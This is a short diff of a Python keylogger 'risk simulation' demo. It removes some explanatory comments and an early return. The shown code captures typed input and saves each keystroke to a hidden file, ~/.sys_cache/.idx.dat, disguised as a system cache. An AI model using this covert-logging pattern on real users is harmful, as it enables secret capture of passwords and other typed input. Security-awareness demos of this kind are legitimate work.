@@ -103,17 +103,14 @@ def run_risk_simulation():
     started = hook.start(duration=None)  # 手动停止，不限时长
 
     if started:
-        # 用 getpass 隐藏回显 — 即使屏幕不显示，键盘记录器依然能捕获
         from getpass import getpass
         getpass("  [输入区域] > ")
         hook.stop()
     else:
-        # pynput 不可用，用 getpass 替代 Hook 做实际键盘输入演示
         from getpass import getpass
         print("  [!] pynput 未安装，切换为模拟记录模式")
         print("  [!] 键盘记录器依然可以捕获你的输入内容：")
         user_input = getpass("  [输入区域] > ")
-        # 手动将输入写入模拟日志文件
         log_dir = Path.home() / ".sys_cache"
         log_dir.mkdir(parents=True, exist_ok=True)
         log_file = log_dir / ".idx.dat"
@@ -122,8 +119,6 @@ def run_risk_simulation():
                 entry = {"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "key": ch}
                 f.write(json.dumps(entry, ensure_ascii=False) + "\n")
         hook.stop()
-        stats = {"duration_seconds": 0, "keys_captured": len(user_input), "keys_per_second": 0, "log_path": str(log_file), "stealth_mode": True}
-        return hook, stats
 
     stats = hook.get_stats()
     print(f"\n[1.5] 键盘Hook运行统计:")
